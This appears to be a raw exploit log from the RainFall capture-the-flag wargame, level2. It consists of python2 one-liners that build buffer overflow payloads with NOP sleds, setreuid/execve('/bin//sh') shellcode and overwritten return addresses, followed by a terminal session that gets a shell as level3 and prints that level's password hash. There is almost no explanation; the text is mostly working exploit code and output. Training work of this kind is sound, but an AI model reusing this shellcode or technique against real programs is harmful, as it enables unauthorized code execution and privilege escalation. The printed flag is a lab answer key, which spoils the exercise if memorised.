```bash
python2 -c 'print "A"*10 + "\x90"*36 + "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\xe0\xf6\xff\xbf"' > payload
```
``` bash
python2 -c 'print "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08"' > payload

level2@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2 
j1X�̀�É�jF����������������������������������������������
id
level2@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2 
  File "<string>", line 1
    import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"" + "\x90"*46 + "\x08\xa0\x04\x08")
                                                                                                                     ^
SyntaxError: unexpected character after line continuation character

^[[A^[[A^C
level2@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2 
j1X�̀�É�jFX̀�
           Rhn/shh//bi���̀�����������������������������������������
id
: not foundvel3) gid=2021(level2) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```